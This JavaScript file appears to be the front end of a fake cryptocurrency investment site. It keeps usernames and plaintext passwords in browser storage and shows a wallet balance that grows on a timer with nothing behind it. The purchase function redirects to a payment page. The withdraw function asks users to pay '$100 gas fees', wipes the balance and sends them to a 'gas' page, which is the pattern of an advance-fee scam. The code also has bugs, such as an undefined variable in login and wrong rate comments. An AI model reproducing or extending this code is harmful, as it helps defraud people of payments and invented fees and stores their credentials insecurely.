let users = JSON.parse(localStorage.getItem('users')) || {};  // Load users from local storage or initialize
let currentUser = localStorage.getItem('currentUser');
let walletBalance = parseFloat(localStorage.getItem('walletBalance')) || 0;
let lastUpdate = parseInt(localStorage.getItem('lastUpdate')) || Date.now();
let balanceInterval;

if (currentUser) {
    document.getElementById('auth').style.display = 'none';
    document.getElementById('dashboard').style.display = 'block';
    document.getElementById('username').textContent = currentUser;
    updateWallet();
    updateBalanceSinceLastUpdate();
    startBalanceIncrease();
}

function signUp() {
    const username = document.getElementById('signup-username').value;
    const password = document.getElementById('signup-password').value;
    
    if (username && password) {
        if (!users[username]) {
            users[username] = password;
            localStorage.setItem('users', JSON.stringify(users));
            alert('Sign up successful. Please log in.');
        } else {
            alert('Username already exists. Please choose another one.');
        }
    } else {
        alert('Please enter a valid username and password.');
    }
}

function logIn() {
    const username = document.getElementById('login-username').value;
    const password = document.getElementById('login-password').value;
    
    if (users[username] && users[username] === password) {
        currentUser = username;
        localStorage.setItem('currentUser', currentUser);
        document.getElementById('auth').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        document.getElementById('username').textContent = currentUser;
        document.getElementById('pr').textContent = buyPlan(amount);
        updateWallet();
        updateBalanceSinceLastUpdate();
        startBalanceIncrease();
    } else {
        alert('Invalid username or password.');
    }
}

function buyPlan(amount) {
    const btc =0.0000021;
    window.location.href = "payment.html";

    walletBalance += amount * btc;
    localStorage.setItem('walletBalance', walletBalance);
    localStorage.setItem('lastUpdate', Date.now());
    
    updateWallet();
}

function updateWallet() {
    document.getElementById('wallet-balance').textContent = walletBalance.toFixed(8);
}
function updateWalle(){
    document.getElementById('pr').innerHTML = walletBalance;
}
function withdraw() {    

    if (confirm('you will pay $100 gas fees if you want to withdraw your balance?')) {
        walletBalance = 0;
        localStorage.setItem('walletBalance', walletBalance);
        clearInterval(balanceInterval);

        updateWallet();
        window.location.href = "gas.html";

        alert('Balance withdrawal in progress...');
    }
}

function updateBalanceSinceLastUpdate() {
    const now = Date.now();
    const secondsElapsed = Math.floor((now - lastUpdate) / 1000);
    walletBalance *= Math.pow(1.05, secondsElapsed);
    lastUpdate = now;
    localStorage.setItem('walletBalance', walletBalance);
    localStorage.setItem('lastUpdate', lastUpdate);
    updateWallet();
}

function startBalanceIncrease() {
    clearInterval(balanceInterval); // Ensure no previous interval is running
    balanceInterval = setInterval(() => {
        walletBalance *= 1.00005; // Increase balance by 5% every second
        localStorage.setItem('walletBalance', walletBalance);
        localStorage.setItem('lastUpdate', Date.now());
        updateWallet();
    }, 10000); // 1000 milliseconds = 1 second
}



function copyToClipboard(selector) {
    // Get the element
    const element = document.querySelector(selector);
    
    // Create a temporary textarea element to hold the text to be copied
    const tempTextarea = document.createElement('textarea');
    tempTextarea.value = element.tagName === 'INPUT' || element.tagName === 'TEXTAREA' ? element.value : element.textContent;
    
    // Append the temporary textarea to the body
    document.body.appendChild(tempTextarea);
    
    // Select the text in the textarea
    tempTextarea.select();
    
    // Execute the copy command
    document.execCommand('copy');
    
    // Remove the temporary textarea from the body
    document.body.removeChild(tempTextarea);
    
    // Alert the user that the text has been copied
    alert('Text copied to clipboard');
    
}

var myInput = document.getElementById("password");
var letter = document.getElementById("letter");
var capital = document.getElementById("capital");
var number = document.getElementById("number");
var length = document.getElementById("length");

// When the user clicks on the password field, show the message box
myInput.onfocus = function() {
  document.getElementById("message").style.display = "block";
}

// When the user clicks outside of the password field, hide the message box
myInput.onblur = function() {
  document.getElementById("message").style.display = "none";
}

// When the user starts to type something inside the password field
myInput.onkeyup = function() {
  // Validate lowercase letters
  var lowerCaseLetters = /[a-z]/g;
  if(myInput.value.match(lowerCaseLetters)) {
    letter.classList.remove("invalid");
    letter.classList.add("valid");
  } else {
    letter.classList.remove("valid");
    letter.classList.add("invalid");
}

  // Validate capital letters
  var upperCaseLetters = /[A-Z]/g;
  if(myInput.value.match(upperCaseLetters)) {
    capital.classList.remove("invalid");
    capital.classList.add("valid");
  } else {
    capital.classList.remove("valid");
    capital.classList.add("invalid");
  }

  // Validate numbers
  var numbers = /[0-9]/g;
  if(myInput.value.match(numbers)) {
    number.classList.remove("invalid");
    number.classList.add("valid");
  } else {
    number.classList.remove("valid");
    number.classList.add("invalid");
  }

  // Validate length
  if(myInput.value.length >= 8) {
    length.classList.remove("invalid");
    length.classList.add("valid");
  } else {
    length.classList.remove("valid");
    length.classList.add("invalid");
  }
}